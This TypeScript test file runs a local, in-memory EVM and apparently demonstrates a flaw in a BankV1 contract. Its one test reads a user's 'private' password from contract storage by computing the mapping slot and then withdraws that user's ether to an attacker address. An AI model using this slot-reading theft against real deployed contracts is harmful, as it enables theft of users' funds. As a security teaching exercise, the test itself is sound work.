import { BankV1 } from './BankV1.s.sol'
import { bytesToBigint, createMemoryClient, encodeAbiParameters, hexToBigInt, keccak256, type MemoryClient, parseEther } from 'tevm'
import { createAddress } from 'tevm/address'
import { beforeEach, test, expect, describe } from 'vitest'

let client: MemoryClient
let bank = BankV1.withAddress(createAddress(0).toString())

const mohamed = createAddress(420420)
const ahmed = createAddress(6969)
const asmaa = createAddress(1111)
const attacker = createAddress(1234567890)

beforeEach(async () => {
  client = createMemoryClient()

  const { createdAddress } = await client.tevmDeploy(BankV1.deploy())
  bank = BankV1.withAddress(createdAddress!)
  await client.tevmMine()

  for (const user of [mohamed, ahmed, asmaa]) {
    await client.tevmSetAccount({
      address: user.toString(),
      balance: parseEther('10')
    })

    const password = bytesToBigint(user.toBytes())

    await client.tevmContract({
      ...bank.write.createAccount(password),
      from: user.toString(),
      createTransaction: true,
    })
    await client.tevmMine()

    await client.tevmContract({
      ...bank.write.depositEther(user.toString()),
      value: parseEther('1'),
      from: user.toString(),
      throwOnFail: false,
      createTransaction: true,
    })
    await client.tevmMine()
  }

  await client.tevmSetAccount({
    address: attacker.toString(),
    balance: parseEther('1')
  })
})

describe('BankV1', () => {
  test('Take ahmed balance', async () => {
    expect(await client.getBalance({ address: attacker.toString() })).toBe(parseEther('1'))

    const slot = keccak256(encodeAbiParameters([{ type: 'address' }, { type: 'uint256' }], [ahmed.toString(), 1n]))

    const password = await client.getStorageAt({ address: bank.address, slot })

    await client.tevmContract({
      ...bank.write.withdrawEther(ahmed.toString(), hexToBigInt(password!), parseEther('1'), attacker.toString()),
      from: attacker.toString(),
      createTransaction: true,
    })
    await client.tevmMine()

    expect(await client.getBalance({ address: attacker.toString() })).toMatchInlineSnapshot(`1999999999999737374n`)
  })
})